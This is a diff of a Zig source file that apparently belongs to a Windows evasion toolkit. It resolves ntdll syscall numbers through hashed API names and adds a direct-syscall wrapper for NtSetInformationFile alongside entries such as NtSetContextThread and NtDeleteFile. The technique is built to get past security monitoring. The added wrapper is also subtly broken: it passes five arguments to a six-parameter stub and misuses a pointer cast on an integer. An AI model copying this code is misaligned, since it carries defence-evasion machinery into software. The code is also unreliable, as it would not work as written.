@@ -27,6 +27,7 @@ pub export var ssn_NtWaitForSingleObject: u32 = 0;
 pub export var ssn_NtOpenKey: u32 = 0;
 pub export var ssn_NtQueryValueKey: u32 = 0;
 pub export var ssn_NtSetInformationProcess: u32 = 0;
+pub export var ssn_NtSetInformationFile: u32 = 0;
 pub export var ssn_NtUserGetSystemMetrics: u32 = 0;
 pub export var ssn_NtGetContextThread: u32 = 0;
 pub export var ssn_NtSetContextThread: u32 = 0;
@@ -58,6 +59,7 @@ extern fn NtWaitForSingleObject_stub(a1: u64, a2: u64, a3: u64) callconv(.c) u64
 extern fn NtOpenKey_stub(a1: u64, a2: u64, a3: u64) callconv(.c) u64;
 extern fn NtQueryValueKey_stub(a1: u64, a2: u64, a3: u64, a4: u64, a5: u64, a6: u64) callconv(.c) u64;
 extern fn NtSetInformationProcess_stub(a1: u64, a2: u64, a3: u64, a4: u64) callconv(.c) u64;
+extern fn NtSetInformationFile_stub(a1: u64, a2: u64, a3: u64, a4: u64, a5: u64, a6: u64) callconv(.c) u64;
 extern fn NtUserGetSystemMetrics_stub(a1: u64) callconv(.c) u64;
 extern fn NtGetContextThread_stub(a1: u64, a2: u64) callconv(.c) u64;
 extern fn NtSetContextThread_stub(a1: u64, a2: u64) callconv(.c) u64;
@@ -182,6 +184,7 @@ pub fn resolve() bool {
     ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtOpenKey"), &ssn_NtOpenKey);
     ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtQueryValueKey"), &ssn_NtQueryValueKey);
     ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtSetInformationProcess"), &ssn_NtSetInformationProcess);
+    ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtSetInformationFile"), &ssn_NtSetInformationFile);
 ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtGetContextThread"), &ssn_NtGetContextThread);
 ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtSetContextThread"), &ssn_NtSetContextThread);
 ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtOpenSection"), &ssn_NtOpenSection);
@@ -559,5 +562,21 @@ pub fn NtDeleteFile(
 ) types.NTSTATUS {
     return @as(types.NTSTATUS, @intCast(NtDeleteFile_stub(
         @intFromPtr(ObjectAttributes),
+    )));
+}
+
+pub fn NtSetInformationFile(
+    FileHandle: types.HANDLE,
+    IoStatusBlock: types.PVOID,
+    FileInformation: types.PVOID,
+    Length: types.ULONG,
+    FileInformationClass: types.ULONG,
+) types.NTSTATUS {
+    return @as(types.NTSTATUS, @intCast(NtSetInformationFile_stub(
+        @intFromPtr(FileHandle),
+        @intFromPtr(IoStatusBlock),
+        @intFromPtr(FileInformation),
+        Length,
+        @intFromPtr(FileInformationClass),
     )));
 }
